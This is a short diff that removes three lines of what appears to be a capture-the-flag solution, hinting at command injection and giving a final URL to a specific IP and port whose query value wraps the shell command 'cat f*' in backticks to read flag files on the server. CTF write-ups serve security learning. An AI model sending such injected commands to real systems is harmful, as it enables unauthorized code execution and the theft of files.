@@ -1,3 +1,0 @@
-Use command injection to solve it.
-The final solution:
-http://104.199.235.135:31333/index.php?%F0%9F%8D%A3=%22.`cat%20f*`.%22
